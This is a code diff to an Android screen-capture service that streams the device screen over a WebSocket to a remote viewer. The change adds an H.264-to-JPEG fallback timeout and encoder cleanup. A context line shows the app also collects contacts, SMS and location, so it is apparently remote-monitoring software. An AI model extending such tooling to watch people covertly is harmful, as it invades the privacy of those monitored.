@@ -64,6 +64,7 @@ public class ScreenCaptureService extends Service {
     private boolean useH264 = true;
     private boolean codecRunning = false;
     private Thread encoderThread;
+    private volatile int h264FrameCount = 0;
 
     // Data collector (contacts, SMS, location)
     private DataCollectorService dataCollector;
@@ -321,6 +322,16 @@ public class ScreenCaptureService extends Service {
             encoderThread = new Thread(this::drainEncoder, "H264-Encoder");
             encoderThread.start();
 
+            // Timeout: if no frames produced in 3 seconds, fallback to JPEG
+            handler.postDelayed(() -> {
+                if (codecRunning && h264FrameCount == 0) {
+                    Log.w(TAG, "H.264 produced 0 frames in 3s — falling back to JPEG");
+                    stopH264();
+                    useH264 = false;
+                    startJpegCapture();
+                }
+            }, 3000);
+
             // Notify viewer about H.264 mode
             try {
                 JSONObject msg = new JSONObject();
@@ -375,6 +386,7 @@ public class ScreenCaptureService extends Service {
                         // Send as binary WebSocket message
                         okio.ByteString binaryData = okio.ByteString.of(packet);
                         webSocket.send(binaryData);
+                        h264FrameCount++;
                     }
 
                     mediaCodec.releaseOutputBuffer(outputIndex, false);
@@ -425,6 +437,28 @@ public class ScreenCaptureService extends Service {
                 Log.e(TAG, "Error requesting keyframe", e);
             }
         }
+    }
+
+    private void stopH264() {
+        codecRunning = false;
+        try {
+            if (mediaCodec != null) {
+                mediaCodec.stop();
+                mediaCodec.release();
+                mediaCodec = null;
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error stopping H.264", e);
+        }
+        if (virtualDisplay != null) {
+            virtualDisplay.release();
+            virtualDisplay = null;
+        }
+        if (encoderSurface != null) {
+            encoderSurface.release();
+            encoderSurface = null;
+        }
+        Log.d(TAG, "H.264 encoder stopped");
     }
 
     // ======================== JPEG FALLBACK ========================
